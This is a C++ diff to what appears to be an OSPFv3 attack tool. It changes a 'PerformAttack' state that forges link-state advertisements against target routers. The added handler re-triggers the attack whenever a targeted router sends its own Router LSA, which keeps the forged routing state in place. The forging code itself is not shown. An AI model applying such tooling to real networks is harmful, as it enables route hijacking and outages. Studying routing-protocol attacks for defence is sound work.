@@ -332,13 +332,14 @@ namespace statemachine {
 		};
 		
 		struct PerformAttack : sc::state<PerformAttack, Machine> {
+			typedef sc::custom_reaction<event::Packet> reactions;
 			typedef sc::state<PerformAttack, Machine> my_base;
+			std::set<uint32_t> relevantRouters;
 			
 			PerformAttack(my_context ctx) : my_base(ctx) {
-				logger->info("Performing attack.");
+				logger->info("Performing attack...");
 				
 				std::vector<std::shared_ptr<parser::LSAPacket>> forgedLSAs, forgedFBLSAs;
-				std::set<uint32_t> relevantRouters;
 				
 				for (auto const&[a, b, metric] : context<Machine>().targets) {
 					relevantRouters.insert(a);
@@ -488,6 +489,23 @@ namespace statemachine {
 					}
 				}
 				
+				logger->info("Attack complete.");
+			}
+			
+			sc::result react(const event::Packet &packet) {
+				if (packet.packet->getHeader().type != parser::OSPFv3Packet::LINK_STATE_UPDATE) {
+					return discard_event();
+				}
+				
+				auto &lsas = std::dynamic_pointer_cast<parser::LinkStateUpdatePacket>(packet.packet->getSubpacket())->getLsas();
+				
+				for (auto const& lsa : lsas) {
+					if (lsa->getHeader().getFunction() == parser::LSAPacket::ROUTER_LSA && relevantRouters.count(lsa->getHeader().advertising_router) > 0) {
+						return transit<PerformAttack>();
+					}
+				}
+				
+				return discard_event();
 			}
 		};
 	}
